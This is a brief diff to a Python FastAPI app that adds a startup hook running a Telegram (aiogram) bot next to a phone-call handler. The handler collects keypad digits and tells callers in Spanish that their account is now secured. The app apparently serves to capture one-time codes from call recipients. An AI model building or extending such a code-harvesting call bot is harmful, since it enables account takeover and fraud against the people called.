@@ -97,5 +97,10 @@ async def procesar_codigo(request: Request, Digits: str = Form(default=None)):
     response.say("Gracias. Su cuenta ha sido asegurada con éxito. Adiós.", language="es-ES")
     return str(response)
 
+# --- INICIO AUTOMÁTICO DE AIOGRAM Y FASTAPI ---
+@app.on_event("startup")
+async def startup_event():
+    asyncio.create_task(dp.start_polling(bot))
+
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
